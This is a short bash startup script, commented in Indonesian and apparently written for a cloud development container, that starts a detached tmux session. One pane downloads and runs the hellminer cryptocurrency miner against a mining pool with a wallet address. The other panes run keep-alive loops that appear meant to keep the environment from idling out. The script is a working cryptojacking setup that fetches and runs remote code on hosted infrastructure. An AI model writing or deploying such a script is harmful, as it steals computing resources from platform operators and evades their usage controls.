#!/bin/bash

# Logging untuk monitoring
LOGFILE="/var/log/codespace_startup.log"
echo "$(date): Container startup" >> $LOGFILE

# Pastikan tmux session "auto_run" aktif
if ! tmux has-session -t auto_run 2>/dev/null; then
  tmux new-session -d -s auto_run 'bash -c "
    # Terminal 1: Menjaga koneksi tetap hidup
    tmux send-keys -t auto_run.0 \"while true; do echo 'Menjaga koneksi tetap hidup...'; sleep 5; done\" ENTER && \

    # Terminal 2: Menjalankan miner
    tmux split-window -v 'bash -c \"wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz && tar -xvzf hellminer_linux64_avx2.tar.gz && ./hellminer -v -c stratum+tcp://cn.vipor.net:5040 -u RJMuH1ems9YZKZ1jDnqTtRLuQvuWmBpznQ.Device10 -p x\"' && \

    # Terminal 3: Ping keep-alive
    tmux split-window -h 'while true; do echo \"Keep-alive ping\" > /dev/null; sleep 10; done' && \

    tmux select-layout tiled && tmux attach
  "'
fi
